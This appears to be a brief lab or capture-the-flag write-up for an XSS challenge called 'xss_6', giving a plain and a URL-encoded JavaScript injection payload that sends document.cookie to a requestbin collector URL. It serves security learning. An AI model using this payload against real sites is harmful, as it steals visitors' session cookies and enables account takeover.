# xss_6 - Injectable Javascript (no `/*` )
- We notice here that a comment symbol is filtered out so we strip that from our payload.
- Payload (plain), `'; img = new Image(); img.src = "http://requestbin.fullcontact.com/18kxbln1/?c="+document.cookie;var foo = '`
- Payload (URL encoded), `%27%3b%20%69%6d%67%20%3d%20%6e%65%77%20%49%6d%61%67%65%28%29%3b%20%69%6d%67%2e%73%72%63%20%3d%20%22%68%74%74%70%3a%2f%2f%72%65%71%75%65%73%74%62%69%6e%2e%66%75%6c%6c%63%6f%6e%74%61%63%74%2e%63%6f%6d%2f%31%38%6b%78%62%6c%6e%31%2f%3f%63%3d%22%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%76%61%72%20%66%6f%6f%20%3d%20%27`
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528364584907_Screenshot+2018-06-07+02.42.05.png)
